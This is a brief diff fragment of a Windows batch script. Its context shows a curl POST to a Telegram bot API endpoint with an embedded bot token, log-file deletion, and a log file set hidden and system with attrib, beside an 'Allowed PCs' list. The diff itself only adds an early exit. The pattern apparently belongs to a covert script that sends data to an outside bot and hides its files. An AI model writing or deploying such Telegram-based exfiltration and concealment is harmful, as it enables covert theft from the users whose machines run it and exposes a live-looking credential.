@@ -18,6 +18,8 @@ curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBu
 
 del /f /a "%LOGFILE%"
 
+goto :EOF
+
 echo. >> "%LOGFILE%" 2>&1
 attrib +h +s "%LOGFILE%"
 echo Allowed PCs : >> "%LOGFILE%" 2>&1
